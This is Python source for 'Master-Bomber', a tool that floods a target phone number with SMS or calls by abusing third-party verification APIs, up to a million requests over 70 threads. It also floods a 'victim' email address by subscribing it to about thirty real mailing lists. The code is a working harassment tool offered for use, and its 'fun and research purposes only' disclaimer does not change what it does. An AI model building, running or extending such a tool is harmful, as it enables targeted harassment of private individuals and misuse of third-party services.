import os, shutil, sys, subprocess, requests, string, random, json, re, time, threading, argparse
from colorama import Fore, Style
from tqdm import tqdm
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


class IconicDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ → ]" + Style.RESET_ALL
        self.STDS = "     "
class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ FAILURE ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
        self.STDS = "           "
class MessageDecorator(object):
    def __init__(self, attr):
        ICON = IconicDecorator()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.STDS = ICON.STDS
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " " + Style.RESET_ALL + RequestMessage)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " " + Style.RESET_ALL + RequestMessage)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)

    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET_ALL + RequestMessage

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " " + Style.RESET_ALL + RequestMessage)
class APIProvider:

    api_providers=[]
    delay = 1
    status = True

    def __init__(self,cc,target,mode,delay=0):
        with open('apidata.json', 'r') as file:
            PROVIDERS = json.load(file)
        self.config = None
        self.cc = cc
        self.target = target
        self.mode = mode
        self.index = 0
        self.lock = threading.Lock()
        APIProvider.delay = delay
        providers=PROVIDERS.get(mode.lower(),{})
        APIProvider.api_providers = providers.get(cc,[])
        if len(APIProvider.api_providers)<10:
            APIProvider.api_providers+=providers.get("multi",[])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc)
        self.config = json.loads(config_dump)

    def select_api(self):
        try:
            self.index = random.choice(range(len(APIProvider.api_providers)))
        except IndexError:
            self.index=-1
            return
        self.config = APIProvider.api_providers[self.index]
        perma_headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"}
        if "headers" in self.config:
            self.config["headers"].update(perma_headers)
        else:
            self.config["headers"]=perma_headers
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except:
            return False

    def request(self):
        self.select_api()
        if not self.config or self.index==-1:
            return None
        identifier=self.config.pop("identifier","").lower()
        del self.config['name']
        self.config['timeout']=30
        response=requests.request(**self.config)
        return identifier in response.text.lower()

    def hit(self):
        try:
            if not APIProvider.status:
                return
            time.sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response==False:
                self.remove()
            elif response==None:
                APIProvider.status=False
            return response
        except:
            response=False
        finally:
            self.lock.release()
            return response


def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes
def get_version():
    return open("version.txt","r").read().strip()
def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
def check_intr():
    try:
        requests.get("https://www.cyberhakz.com")
    except Exception:
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)
def format_phone(num):
    num=[n for n in num if n in string.digits]
    return ''.join(num).strip()
def get_phone_info():
    while True:
        target = ""
        cc = input(mesgdcrt.CommandMessage("Enter your country code (Without +): "))
        cc = format_phone(cc)
        if not country_codes.get(cc,False):
            mesgdcrt.WarningMessage("The country code ({cc}) that you have entered is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.CommandMessage("Enter the target number: +" + cc + " "))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage("The phone number ({target}) that you have entered is invalid".format(target=target))
            continue
        return (cc,target)
def pretty_print(cc,target,success,failed):
    requested = success+failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : " + cc +" "+ target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    mesgdcrt.SuccessMessage("Master-Bomber was created by Navin Hariharan")
def workernode(mode,cc,target,count,delay,max_threads):

    api = APIProvider(cc,target,mode,delay=delay)
    
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count) )
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    print()
    if len(APIProvider.api_providers)==0:
        mesgdcrt.FailureMessage("Your country/target is not supported as of now")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        sys.exit()
    success,failed=0,0
    while success<count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))
            for job in as_completed(jobs):
                result = job.result()
                if result==None:
                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    sys.exit()
                if result:
                    success+=1
                else:
                    failed+=1
                clr()
                pretty_print(cc,target,success,failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    sys.exit()
def selectnode(mode="sms"):
    mode=mode.lower().strip()
    try:
        check_intr()
        max_limit={"sms":1000000,"call":1000000}
        cc,target="",""
        if mode in ["sms","call"]:
            cc,target=get_phone_info()
        else:
            raise KeyboardInterrupt
        limit=max_limit[mode]
        while True:
            try:
                message=("Enter number of {type} to send (Max {limit}): ").format(type=mode.upper(),limit=limit)
                count = int(input(mesgdcrt.CommandMessage(message)).strip())
                if count > limit or count==0:
                    mesgdcrt.WarningMessage("You have requested " + str(count) + " {type}".format(type=mode.upper()))
                    mesgdcrt.GeneralMessage("Automatically capping the value to {limit}".format(limit=limit))
                    count = limit
                delay = 1
                max_threads = 70
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()
        workernode(mode,cc,target,count,delay,max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()
        workernode(mode,cc,target,count,delay,max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()
def mail():
  spam_id = str(input("\033[1;33;40mEnter the e-mail address of victim: "))
  count= 100
  urllist=["http://list.webaim.org/mailman/subscribe/webaim-forum?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-internals?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-news?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://audifans.com/mailman/subscribe/es2?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/offtopic?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/marketplace?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/events?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/staff?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/tt?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/torsen?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://audifans.com/mailman/subscribe/vwdiesel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v6-12v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v8?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/urq?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/av-games?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/sundaynightgames?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs-web?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/india-drug?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-stacey?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/springsource-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/vmwaretest?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/security-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/solutionproviderroundtable?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/quattro?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/jugglefest-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/aow?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-webmaster?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/fusion-enterprise?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe"]
  loop = tqdm(total = 100, position=0,leave=False)
  for var in range (count):
    loop.set_description("Sending...".format(var))
    try:
      url=urllist[var]
      requests.get(url)
      loop.update(1)
    except:
      clr()
      print("\033[1;31;40mE-mail can't be sent, Try after sometime...")
      exit(0)
    time.sleep(3)      
  loop.close()




country_codes = readisdc()["isdcodes"]
mesgdcrt = MessageDecorator("icon")
__VERSION__ = get_version()
ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL
description="""Master-Bomber [The Ultimate Bomber]

The uses of Master-Bomber - 
\t Exposing the vulnerable APIs over Internet
\t Testing Your Spam Detector 
\t Friendly SMS Spamming
\t Friendly Mail Spamming
\t Anonymous SMS/Mailing

Master Bomber is not intented for malicious uses.
"""
parser = argparse.ArgumentParser(description=description,epilog='Coded by Navin Hariharan !!!')
parser.add_argument("-sms","--sms", action="store_true",help="Sms Bomber")
parser.add_argument("-call","--call", action="store_true",help="Call Bomber")
parser.add_argument("-mail","--mail", action="store_true",help="Mail Bomber")
if __name__ == "__main__":
    args = parser.parse_args()
    if args.mail:
        mail()     
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        sys.exit()
    sys.exit()
